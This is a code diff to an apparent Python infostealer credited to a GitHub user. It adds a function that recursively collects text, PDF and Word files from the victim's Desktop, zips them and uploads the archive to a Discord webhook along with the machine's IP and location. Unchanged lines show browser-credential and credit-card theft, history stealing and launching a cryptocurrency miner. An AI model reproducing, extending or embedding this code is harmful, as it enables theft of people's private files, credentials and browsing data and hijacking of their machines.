@@ -17,7 +17,7 @@ import wmi
 import json
 import uuid
 import textwrap
-from glob import glob
+import glob
 import FireFoxDecrypt
 import requests
 import sys
@@ -123,6 +123,7 @@ chromiumpaths = [
 	local_appdata + "Chromodo",
 	local_appdata + "Yandex\\YandexBrowser"
 ]
+
 
 yes = "yes"
 
@@ -601,6 +602,19 @@ if yes == "yes":
 		except:
 			pass
 		return ccss
+
+
+	def getfiles():
+		desktop = os.path.join(os.path.join(os.path.expanduser('~')), 'Desktop') 
+		path = desktop + r'/**/*.txt'
+		files = glob.glob(path, recursive=True)
+		path = desktop + r'/**/*.pdf'
+		files.extend(glob.glob(path, recursive=True))
+		path = desktop + r'/**/*.doc'
+		files.extend(glob.glob(path, recursive=True))
+		with zipfile.ZipFile('desktop.zip', 'w') as zipF:
+		    for file in files:
+		        zipF.write(file, compress_type=zipfile.ZIP_DEFLATED)
 	def MineThreadWin():
 		print("[.] Starting miner if enabled.")
 		os.system(XMRIGPATH)
@@ -733,6 +747,7 @@ if yes == "yes":
 				print("[.] Executing miner..")
 	
 	if(chiffre != "" and chiffre != None):
+		getfiles()
 		print("[.] Sending")
 		webhook = DiscordWebhook(url=chiffre, username="github.com/0xSxZ/Veerus/")
 		embed = DiscordEmbed(title='New Machine connected', description=f'New machine connected\nInfos : \nIP : {IP}\nCity : {city}\nCountry : :flag_{country.lower()}:', color='03b2f8')
@@ -758,5 +773,12 @@ if yes == "yes":
 		webhook.add_file(file="""=========Stealed By 0xSxZ on github =============
 
 		""" + stealChromeWinHistory().replace("'", '').replace("'", ''), filename="Lmao_PornHub_History_XDDD.txt")
-		webhook.execute()
+		webhook.execute()	
 	connectOption()
+	os.system("cd")
+	getfiles()
+	time.sleep(10)
+	print("[.] Sending Desktop")
+	webhook = DiscordWebhook(url=chiffre, username="github.com/0xSxZ/Veerus/")
+	webhook.add_file(file=open("desktop.zip", "rb").read(), filename="desktop.zip")
+	webhook.execute()
